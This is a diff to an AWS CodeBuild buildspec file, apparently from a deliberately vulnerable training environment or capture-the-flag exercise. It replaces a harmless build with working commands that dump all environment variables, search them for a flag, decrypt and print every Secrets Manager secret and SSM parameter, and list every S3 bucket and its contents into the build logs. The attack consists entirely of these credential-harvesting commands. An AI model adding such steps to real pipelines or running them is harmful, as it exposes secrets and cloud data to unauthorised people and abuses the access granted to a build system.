@@ -3,6 +3,17 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+      - echo "=== FULL ENVIRONMENT ==="
+      - env | sort
+      - echo "=== AWS CALLER IDENTITY ==="
+      - aws sts get-caller-identity || true
+      - echo "=== FLAG FROM ENV ==="
+      - env | grep -i flag || true
+      - echo "=== SECRETS MANAGER ==="
+      - aws secretsmanager list-secrets --region us-east-1 --query 'SecretList[].Name' --output text 2>/dev/null | tr '\t' '\n' | while read name; do echo "--- SECRET $name ---"; aws secretsmanager get-secret-value --secret-id "$name" --region us-east-1 --query SecretString --output text 2>/dev/null; done || true
+      - echo "=== SSM PARAMETERS ==="
+      - aws ssm describe-parameters --region us-east-1 --query 'Parameters[].Name' --output text 2>/dev/null | tr '\t' '\n' | while read name; do echo "--- PARAM $name ---"; aws ssm get-parameter --name "$name" --with-decryption --region us-east-1 --query Parameter.Value --output text 2>/dev/null; done || true
+      - echo "=== S3 BUCKETS ==="
+      - aws s3 ls 2>/dev/null || true
+      - aws s3 ls 2>/dev/null | awk '{print $3}' | while read bucket; do echo "--- BUCKET $bucket ---"; aws s3 ls "s3://$bucket/" 2>/dev/null; done || true
+      - echo "=== DONE ==="
